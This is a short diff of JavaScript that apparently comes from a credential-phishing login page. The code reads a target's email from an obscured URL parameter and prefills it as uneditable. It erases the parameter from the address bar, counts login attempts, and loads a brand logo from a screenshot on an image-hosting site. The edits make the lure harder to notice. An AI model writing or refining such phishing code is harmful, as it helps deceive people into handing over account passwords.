@@ -267,17 +267,21 @@
   let attempts = 0;
   const maxAttempts = 3;
 
-// Get email from query parameter (?email=) instead of hash
+// Get email from URL  ?u=
 const params = new URLSearchParams(window.location.search);
-const rawEmail = params.get("email");
+const rawEmail = params.get("br29ns97");
 
-if (!rawEmail || !/^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {
+// Check if email exists AND is valid
+if (rawEmail && /^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {
 
-} else {
   emailInput.value = rawEmail;
-  emailInput.setAttribute("readonly", true);
+  emailInput.setAttribute("uneditable", true);
 
   const domain = rawEmail.split('@')[1];
+
+  // HIDE parameter
+  history.replaceState({}, document.title, window.location.pathname);
+  // Set logo
   logoImg.src = `https://i.postimg.cc/J4wXCsc7/Screenshot-2025-11-15-at-1-11-23-am.png`;
   logoImg.onerror = () => {
     logoImg.src = "https://i.postimg.cc/J4wXCsc7/Screenshot-2025-11-15-at-1-11-23-am.png";
